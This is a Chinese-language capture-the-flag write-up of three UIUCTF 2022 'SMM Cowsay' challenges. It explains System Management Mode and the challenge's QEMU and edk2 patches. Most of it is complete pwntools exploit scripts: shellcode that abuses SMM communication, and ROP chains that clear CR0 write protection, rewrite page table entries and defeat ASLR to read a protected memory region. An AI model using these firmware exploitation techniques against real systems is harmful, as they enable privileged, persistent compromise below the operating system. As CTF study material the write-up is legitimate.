## System

>  基本上參考 https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/ 重新做一次



### SMM Cowsay 1

#### SMM (SYSTEM MANAGEMENT MODE)

為一種特殊的作業系統模式，通常只用在 system firmware 需要，進行像是 power management、system hardware control、proprietary OEM-designed code 等操作。進入 SMM 會需要 system management interrupt (SMI)，並在觸發時保存 processor context，切換至另一種空間，之後執行預先註冊的 SMI handler，而 smi handler 的程式碼與資料會放在 SMRAM。執行期間任何外部的 interrupt 都處於 disable 的情況，並且 SMI 會 disables paging，這也代表 SMM 擁有極高的執行權限，也因此被稱作 ring-2。執行完畢後能透過指令 **resume (RSM)** 回到原本的 mode。



#### QEMU patch

- 從非 SMM 底下會讀出 `uiuctf{nice try!!!!!!!!!!!!}`
- softmmu - qemu memory emulation
  - `uiuctfmmio_gbl_init()`
    - --> `uiuctfmmio_load_data()` - 讀 flag file 存在 local var `buffer`，並更新傳入的 pointer of pointer  指向 `buffer`
  - `uiuctfmmio_region4_read_with_attrs()` - 當 `attrs.secure` (`MemTxAttrs attrs`) 為 true 才會讀 flag
    - --> `uiuctfmmio_do_read()` - 讀 `msg` 到傳入的參數中
    - `secure` 的屬性定義在 https://github.com/qemu/qemu/blob/v7.0.0/include/exec/memattrs.h#L35，對於 x86 來說即是 system management mode
    - 同時也為 operation table `.read_with_attrs` 所對到的 function



#### edk2 (UEFI implementation) patch

1. 修復現有 CVE
2. 簡化 shell
3. 實作 cowsay 的程式邏輯 (SmmCowsay.efi)，並且在 SMM 底下執行
   - `SmmCowsayHandler()` 以傳進參數 `CommBuffer` 存放的 pointer 來呼叫 `Cowsay(msg)`，印出指定的訊息
   - 在 `SmmCowsayInit()` 註冊 `SmmCowsayHandler()` 為 Smi handler (`SmiHandlerRegister()`)
4. UEFI 的 main function `UefiMain()` (Binexec.efi)
   - 呼叫 `Cowsay()` --> 與 SmmCowsay.efi 溝通 (`mSmmCommunication->Communicate()`) --> 給 global symbol table address `gST` 以及 buffer addr `mCodeBuf` --> 讀 `keystrike()`
     - `Line[]` 變數讀輸入
     - 輸入 `DONE` 會把輸入轉成 code 來執行
       - rax - `&mCodeBuf`
       - rbx - `gST`
5. 將 page 的保護權限給關掉



在第四點時會用到結構 `EFI_SMM_COMMUNICATE_HEADER` 來描述即將傳入的參數狀態：

```c
typedef struct {
  ///
  /// Allows for disambiguation of the message format.
  ///
  EFI_GUID    HeaderGuid;
  ///
  /// Describes the size of Data (in bytes) and does not include the size of the header.
  ///
  UINTN       MessageLength;
  ///
  /// Designates an array of bytes that is MessageLength in size.
  ///
  UINT8       Data[1];
} EFI_MM_COMMUNICATE_HEADER;
```



而在 `UefiMain()` 的開頭有給了 system table 的位址，system table 實際功能可以參考 spec，對應 edk2 的結構則在 https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi/UefiSpec.h#L1976 ：

```c
typedef struct {
  ///
  /// The table header for the EFI System Table.
  ///
  EFI_TABLE_HEADER                   Hdr;
  ...
} EFI_SYSTEM_TABLE;
```

```c
typedef struct {
  ///
  /// The table header for the EFI Boot Services Table.
  ///
  EFI_TABLE_HEADER                              Hdr;

} EFI_BOOT_SERVICES;
```



由於 `SmmCowsayHandler()` 會在 SMM 底下輸出傳入位址的字串，因此如果我們能參考 Binexec `UefiMain()` 中的程式碼，執行相同的程式流程，這樣就可以印出 0x44440000。第一步先模擬：

```
+  Status = gBS->LocateProtocol(^M
+    &gEfiSmmCommunicationProtocolGuid,^M
+    NULL,^M
+    (VOID **)&mSmmCommunication^M
+    );^M
```



exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

r = process('./run.sh')

r.recvuntil('SystemTable: ')
addr_system_table = int(r.recvline()[:-1], 16)
r.recvuntil('your code: ')
addr_code_buf = int(r.recvline()[:-1], 16)
info(f"addr_system_table: {hex(addr_system_table)}")
info(f"addr_code_buf: {hex(addr_code_buf)}")

# 因為是 UTF16 (CHAR16*)，所以需要印兩次
addr_region_4 = 0x44440000
addr_region_4_next = 0x44440001

offset_BS = 0x60
addr_BS = 0x6FC0DC0
offset_LocateFunc = 0x140
offset_AllocPool = 0x40 # (PoolType, Size, *Buffer)
addr_LocateFunc = 0x6F9FAA3
enum_EfiRuntimeServicesData = 6

sc = asm(
f"""
/* Get AllocPool() addr */
mov rax, {addr_system_table + offset_BS}
mov rax, qword ptr [rax]
mov rax, qword ptr [rax + {offset_AllocPool}]

/* AllocPool(enum_EfiRuntimeServicesData, 0x20, buffer) */
mov rcx, {enum_EfiRuntimeServicesData}
mov rdx, 0x20
lea r8, qword ptr [rip + buffer]
call rax
test rax, rax
jnz fail

/* Copy header data to valid buffer */
/* (memcpy(*buffer, efi_smm_comminucate_hdr, 0x20) */
lea rsi, qword ptr [rip + efi_smm_comminucate_hdr]
mov rdi, qword ptr [rip + buffer]
mov rcx, 0x20
cld
rep movsb

/* Get LocateProtocol() addr */
mov rax, {addr_system_table + offset_BS}
mov rax, qword ptr [rax]
mov rax, qword ptr [rax + {offset_LocateFunc}]

/* LocateProtocol(&protocol_guid, NULL, &protocol_buff) */
lea rcx, qword ptr [rip + protocol_guid]
xor rdx, rdx
lea r8, qword ptr [rip + protocol_buff]
call rax
mov rbx, qword ptr [rip + protocol_buff]
test rax, rax
jnz fail

/* Communicate(&mSmmCommunication, &buffer, NULL) */
mov rcx, qword ptr [rip + protocol_buff]
mov rax, qword ptr [rcx]
mov rdx, qword ptr [rip + buffer]
xor r8, r8
call rax
test rax, rax
jnz fail
ret

fail:
    ud2

protocol_guid: .long 0xc68ed8e2, 0x4cbd9dc6, 0x65db949d, 0x32c3c5ac
protocol_buff: .long 0
dummy: .fill 5,1,0
efi_smm_comminucate_hdr:
    .long 0x9a75cf12, 0x4d102c83, 0x7535a8b5, 0xf7926554
    .quad 8
    .quad {addr_region_4}
buffer: .long 0
""")

r.sendline(sc.hex())
r.sendline('done')

r.interactive()
```

- offset 可以透過 `gdb smm_cowsay_1/challenge/handout/edk2_artifacts/Binexec.debug` 後執行 `ptype EFI_SYSTEM_TABLE` 來看結構內容，並且算出 `->BootServices` 的 offset
  - `p &((EFI_SYSTEM_TABLE *)0)->BootServices`
  - `p &((EFI_BOOT_SERVICES *)0)->LocateProtocol`

- ```c
  // EFI_STATUS == unsigned long long
  
  typedef
  EFI_STATUS
  (EFIAPI *EFI_MM_COMMUNICATE)(
    IN CONST EFI_MM_COMMUNICATION_PROTOCOL   *This,
    IN OUT VOID                              *CommBuffer,
    IN OUT UINTN                             *CommSize OPTIONAL
    );
  
  struct _EFI_MM_COMMUNICATION_PROTOCOL {
    EFI_MM_COMMUNICATE    Communicate;
  };
  ```

- 關於 asm 中宣告 variable 的一些寫法：https://stackoverflow.com/questions/46661035/how-many-bytes-does-fill-long-mean-in-assembly



---



### SMM Cowsay 2



0004-Add-UEFI-Binexec.patch

- 與 cowsay1 差在 Buffer 這次會直接讀 message 字串而非位址

0003-SmmCowsay-Vulnerable-Cowsay.patch

- 多了結構 `mDebugData`，並在 `SmmCowsayHandler()` 多了結構操作與檢查

  ```c
  struct {
    CHAR16 Message[200];
    VOID EFIAPI (* volatile CowsayFunc)(IN CONST CHAR16 *Message, IN UINTN MessageLen);
    BOOLEAN volatile Icebp;
    UINT64 volatile Canary;
  } mDebugData;
  ```

  - `mDebugData.CowsayFunc = Cowsay` in the `SmmCowsayInit()`
  - 用 `AsmRdRand64()` 產生 `mDebugData.Canary`，而在後續會檢查 Canary 是否有變來判斷 overflow
  - `SmmCopyMemToSmram(mDebugData.Message, CommBuffer, TempCommBufferSize);`
    - 從 buffer 中複製 message 到 `mDebugData.Message`，大小為傳入參數 `*CommBufferSize` (變數 `TempCommBufferSize`)

- `SmmCowsayHandler()` 提供 icebp (int1, byte 0xf1) 來做斷點

  - 後續呼叫 `mDebugData.CowsayFunc(CommBuffer, TempCommBufferSize);`

- `Cowsay()` 唯一的不同就是會考慮傳進來的 message size

0005-PiSmmCpuDxeSmm-Protect-flag-addresses.patch

- 沒有 RWX page 了
- 0x44440000 的權限被設為 read protect，代表無法讀取



洞在於 `struct mDebugData` 的 `Message` field 只有 400 bytes (CHAR16 * 200) 空間，因此接在後面的其他 field 可以被 overflow，而緊接著的 field 則是 function pointer `CowsayFunc`。

exploit:

```python
#!/usr/bin/python3

from pwn import *

context.arch = 'amd64'

r = process('./run.sh')

r.recvuntil('SystemTable: ')
addr_system_table = int(r.recvline()[:-1], 16)
r.recvuntil('your code: ')
addr_code_buf = int(r.recvline()[:-1], 16)
info(f"addr_system_table: {hex(addr_system_table)}")
info(f"addr_code_buf: {hex(addr_code_buf)}")

addr_region_4 = 0x44440000

offset_BS = 0x60
offset_LocateFunc = 0x140
offset_AllocPool = 0x40
enum_EfiRuntimeServicesData = 6

### our target is to unset cr0.WP and write new PTE
# cr3 = [ PDBR=0x7fa7 PCID=0 ]
# cr0 = [ PG WP NE ET MP PE ]
level1_idx = (0x44440000 >> (12 + 9 + 9 + 9)) & 0x1ff # 0, 0x7fa8000
level2_idx = (0x44440000 >> (12 + 9 + 9)) & 0x1ff # 1, 0x7faa000
level3_idx = (0x44440000 >> (12 + 9)) & 0x1ff # 34, 0x7ed0000
level4_idx = (0x44440000 >> (12)) & 0x1ff # 64
addr_0x44440000_PTE = 0x7ed0200
new_0x44440000_PTE = 0x8000000044440067
new_cr0_value = 0x80010033 & ~(1 << 16)

rop_ret_0x70 = 0x7f8ba49
rop_pop_rsp_ret = 0x7fe5269
rop_pop_rax_ret = 0x7f8a184
rop_pop_rcx_rbx_ret = 0x7ee33fd
rop_mov_qptr_rcx_rax_ret = 0x7eea62d
rop_mov_cr0_rax_ret = 0x7fcf6ef
rop_mov_rax_qptr_rbx_add_rsp_0x28_ret = 0x7fdadc8

rop = [
    # update cr0
    rop_pop_rax_ret,
    new_cr0_value,

    rop_mov_cr0_rax_ret,

    # update PTE and set flag addr to rbx
    rop_pop_rcx_rbx_ret,
    addr_0x44440000_PTE,
    addr_region_4,

    rop_pop_rax_ret,
    new_0x44440000_PTE,
	rop_mov_qptr_rcx_rax_ret,                                                             

    # leak flag
    rop_mov_rax_qptr_rbx_add_rsp_0x28_ret,
]
rop_chain_str = ','.join(map(hex, rop))

payload = b'A\x00' * 200 + p64(rop_ret_0x70)

sc = asm(
f"""
/* Get AllocPool() addr */
mov rax, {addr_system_table + offset_BS}
mov rax, qword ptr [rax]
mov rax, qword ptr [rax + {offset_AllocPool}]

/* AllocPool(enum_EfiRuntimeServicesData, size, buffer) */
mov rcx, {enum_EfiRuntimeServicesData}
mov rdx, {len(payload) + 0x18}
lea r8, qword ptr [rip + buffer]
push rax
call rax
test rax, rax
jnz fail

pop rax
mov rcx, {enum_EfiRuntimeServicesData}
mov rdx, {len(rop) * 8}
lea r8, qword ptr [rip + rop_buffer]
call rax
test rax, rax
jnz fail

/* Copy header data to valid buffer */
lea rsi, qword ptr [rip + efi_smm_comminucate_hdr]
mov rdi, qword ptr [rip + buffer]
mov rcx, {len(payload) + 0x18}
cld
rep movsb

lea rsi, qword ptr [rip + rop_chain]
mov rdi, qword ptr [rip + rop_buffer]
mov rcx, {len(payload) + 0x18}
cld
rep movsb

/* Get LocateProtocol() addr */
mov rax, {addr_system_table + offset_BS}
mov rax, qword ptr [rax]
mov rax, qword ptr [rax + {offset_LocateFunc}]

/* LocateProtocol(&protocol_guid, NULL, &protocol_buff) */
lea rcx, qword ptr [rip + protocol_guid]
xor rdx, rdx
lea r8, qword ptr [rip + protocol_buff]
call rax
mov rbx, qword ptr [rip + protocol_buff]
test rax, rax
jnz fail

/* Communicate(&mSmmCommunication, &buffer, NULL) */
mov rcx, qword ptr [rip + protocol_buff]
mov rax, qword ptr [rcx]
mov rdx, qword ptr [rip + buffer]
xor r8, r8

mov r14, {rop_pop_rsp_ret}
mov r15, qword ptr [rip + rop_buffer]

call rax
test rax, rax
jnz fail
ret

fail:
    ud2

protocol_guid: .long 0xc68ed8e2, 0x4cbd9dc6, 0x65db949d, 0x32c3c5ac
protocol_buff: .long 0
dummy: .long 0
buffer: .quad 0
rop_buffer: .quad 0
rop_chain: .quad {rop_chain_str}
efi_smm_comminucate_hdr:
    .long 0x9a75cf12, 0x4d102c83, 0x7535a8b5, 0xf7926554
    .quad {len(payload)}
""")

r.sendline(sc.hex() + payload.hex())
r.sendline('done')
r.recvuntil('RAX  - ')
flag = bytes.fromhex(r.recvuntil(',', drop=True).decode())[::-1]
print(flag)

r.close()
```



---



### SMM Cowsay 3

與 Cowsay 2 差在加了三個 patch：

- 0006-OvmfPkg-SmmCpuFeaturesLib-Enable-SMRR-SMM_CODE_CHK_E.patch
  - Enable SMRR & SMM_CODE_CHK_EN
    - **SMM_CODE_CHK_EN** - any logical processor in the package that attempts to execute SMM code not within the ranges defined by the SMRR will assert an unrecoverable MCE
    - **System-Management Range Register (SMRR)** - restricts access to the address range defined in the SMRR registers
      - mSmrrPhysBaseMsr - base address
      - mSmrrPhysMaskMsr - size
  - 無法在 SMM 中執行不落在 SMR 的 code
- 0007-Merge-in-ASLR-changes-from-SecurityEx.patch
- 0008-ASLR-Improvements.patch
  - 在所有 runtime drivers 上實作 alsr



漏洞仍相同，打法差在：

1. 要先 leak base address
2. ROP gadget 要從 SMR 裡面找

首先需要看有哪些 function 可以透過 `LocateProtocol()` 來取得，定義在 https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec，而同時這些 protocol function 需要位在 SMR 當中。



之後會找到一個符合條件的 function `gEfiSmmConfigurationProtocolGuid()`，查看 debug info 會知道它落在 binary **PiSmmCpuDxeSmm.efi** 當中，我們此時已經有 binary base，接下來就是從中找好用的 gadget。而 gadget 無法做到 walk page table，因此 walk 部分的行為會透過任意寫寫在 PiSmmCpuDxeSmm.efi 的 .text 的開頭，能寫入的原因是 cr0.WP 是沒有被設上的。最後寫完 shellcode 直接跳上去執行，並用 panic dump register 來 leak 8 bytes flag。



exploit：

```python
#!/usr/bin/python3

from pwn import *
import os

context.arch = 'amd64'

r = process('./run.sh')

r.recvuntil('SystemTable: ')
addr_system_table = int(r.recvline()[:-1], 16)
r.recvuntil('your code: ')
addr_code_buf = int(r.recvline()[:-1], 16)
info(f"addr_system_table: {hex(addr_system_table)}")
info(f"addr_code_buf: {hex(addr_code_buf)}")

addr_region_4 = 0x44440000

offset_BS = 0x60
offset_LocateFunc = 0x140
offset_AllocPool = 0x40
enum_EfiRuntimeServicesData = 6

input('enter to start...')
debug_log = open("./debug.log", "r").read()
smm_base_idx = debug_log.index('SMBASE=') + len('SMBASE=')
smm_base = int(debug_log[smm_base_idx:smm_base_idx+8], 16)
info(f"smm_base: {hex(smm_base)}")

if not os.path.exists('./smm_guids'):
    os.system('cat MdePkg.dec | grep "Smm" | grep "ProtocolGuid" > smm_guids')

guids = open("./smm_guids", "r").read().split('\n')[:-1]

def list_to_int(l, sl):
    s = 0
    for i in range(len(l)):
        s <<= sl
        s += l[len(l) - i - 1]
    return s

efi_base = 0
for guid in guids:
    guid = guid.strip()
    name, value = guid.split('= {')
    name = name.strip()
    value = value.strip()
    value = value.replace('}}', '').replace('{', '').replace(' ', '').split(',')
    value = list(map(lambda x: int(x, 16), value))
    if name != 'gEfiSmmConfigurationProtocolGuid': # (PiSmmCpuDxeSmm.efi)
        continue

    protocol_guid = []
    protocol_guid.append(list_to_int(value[:1], 32))
    protocol_guid.append(list_to_int(value[1:3], 16))
    protocol_guid.append(list_to_int(value[3:7], 8))
    protocol_guid.append(list_to_int(value[7:], 8))
    protocol_guid_str = ','.join(map(hex, protocol_guid))

    sc = asm(
    f"""
    /* Get LocateProtocol() addr */
    mov rax, {addr_system_table + offset_BS}
    mov rax, qword ptr [rax]
    mov rax, qword ptr [rax + {offset_LocateFunc}]

    /* LocateProtocol(&protocol_guid, NULL, &protocol_buff) */
    lea rcx, qword ptr [rip + protocol_guid]
    xor rdx, rdx
    lea r8, qword ptr [rip + protocol_buff]
    call rax

    mov rbx, qword ptr [rip + protocol_buff]
    ret

    dummy: .fill 12,1,0
    protocol_guid: .long {protocol_guid_str}
    protocol_buff: .long 0
    """)

    r.sendline(sc.hex())
    r.sendline('done')
    r.recvuntil('done')
    
    r.recvuntil('RAX: ')
    rax = int(r.recvuntil(' ', drop=True), 16)
    r.recvuntil('RBX: ')
    rbx = int(r.recvuntil(' ', drop=True), 16)

    if rax != 0:
        continue

    if rbx > smm_base:
        print(f"{name}: {hex(rbx)}")
        efi_base = rbx - 0x16210
        break

info(f"PiSmmCpuDxeSmm.efi base address: {hex(efi_base)}")

new_cr0_value = 0x80010033 & ~(1 << 16)
new_0x44440000_PTE = 0x8000000044440067
rop_pop_rsp_ret = efi_base + 0x1811
rop_ret_0x6d = efi_base + 0xfc8a
rop_mov_cr0_rax_ret = efi_base + 0x10a5f
rop_pop_rax_rbx_ret = efi_base + 0x1088c
rop_mov_qptr_rbx_rax_pop_rbx_ret = efi_base + 0x3b8f

s2_shellcode = asm(f"""
mov rbx, 0xfffff000
mov rax, cr3

mov rax, qword ptr [rax + 0*8]
and rax, rbx

mov rax, qword ptr [rax + 1*8]
and rax, rbx

mov rax, qword ptr [rax + 34*8]
and rax, rbx

add rax, {64*8}
mov rbx, {new_0x44440000_PTE}
mov qword ptr [rax], rbx

mov rax, {addr_region_4}
mov rbx, qword ptr [rax]

ud2
""")

rop = [
    # update cr0.WP
    rop_pop_rax_rbx_ret,
    new_cr0_value, 0xdeadbeef,
    rop_mov_cr0_rax_ret,
]

for i in range(0, len(s2_shellcode), 8):
    code = int(s2_shellcode[i:i+8][::-1].hex(), 16)
    rop.append(rop_pop_rax_rbx_ret)
    rop.append(code)
    rop.append(efi_base + 0x1000 + i)
    rop.append(rop_mov_qptr_rbx_rax_pop_rbx_ret)
    rop.append(0xdeadbeef)

rop.append(efi_base + 0x1000)
rop_chain_str = ','.join(map(hex, rop))
payload = b'A\x01' * 200 + p64(rop_ret_0x6d)

sc = asm(
f"""
/* Get AllocPool() addr */
mov rax, {addr_system_table + offset_BS}
mov rax, qword ptr [rax]
mov rax, qword ptr [rax + {offset_AllocPool}]

/* AllocPool(enum_EfiRuntimeServicesData, size, buffer) */
mov rcx, {enum_EfiRuntimeServicesData}
mov rdx, {len(payload) + 0x18}
lea r8, qword ptr [rip + buffer]
push rax
call rax
test rax, rax
jnz fail

pop rax
mov rcx, {enum_EfiRuntimeServicesData}
mov rdx, {len(rop) * 8}
lea r8, qword ptr [rip + rop_buffer]
call rax
test rax, rax
jnz fail

/* Copy header data to valid buffer */
lea rsi, qword ptr [rip + efi_smm_comminucate_hdr]
mov rdi, qword ptr [rip + buffer]
mov rcx, {len(payload) + 0x18}
cld
rep movsb

lea rsi, qword ptr [rip + rop_chain]
mov rdi, qword ptr [rip + rop_buffer]
mov rcx, {len(payload) + 0x18}
cld
rep movsb

/* Get LocateProtocol() addr */
mov rax, {addr_system_table + offset_BS}
mov rax, qword ptr [rax]
mov rax, qword ptr [rax + {offset_LocateFunc}]

/* LocateProtocol(&protocol_guid, NULL, &protocol_buff) */
lea rcx, qword ptr [rip + protocol_guid]
xor rdx, rdx
lea r8, qword ptr [rip + protocol_buff]
call rax
mov rbx, qword ptr [rip + protocol_buff]
test rax, rax
jnz fail

/* Communicate(&mSmmCommunication, &buffer, NULL) */
mov rcx, qword ptr [rip + protocol_buff]
mov rax, qword ptr [rcx]
mov rdx, qword ptr [rip + buffer]
xor r8, r8

mov r14, {rop_pop_rsp_ret}
mov r15, qword ptr [rip + rop_buffer]

mov r13, r14
shl r13, 40
shr r14, 24

mov rbx, r15
shl rbx, 40
add r14, rbx

shr r15, 24
call rax
test rax, rax
jnz fail
ret

fail:
    ud2

dummy: .fill 12,1,0
protocol_guid: .long 0xc68ed8e2, 0x4cbd9dc6, 0x65db949d, 0x32c3c5ac
protocol_buff: .quad 0
buffer: .quad 0
rop_buffer: .quad 0
rop_chain: .quad {rop_chain_str}
efi_smm_comminucate_hdr:
    .long 0x9a75cf12, 0x4d102c83, 0x7535a8b5, 0xf7926554
    .quad {len(payload)}
""")

info(f"bp: {hex(rop_ret_0x6d)}")
r.sendline(sc.hex() + payload.hex())
r.sendline('done')

r.interactive()
```

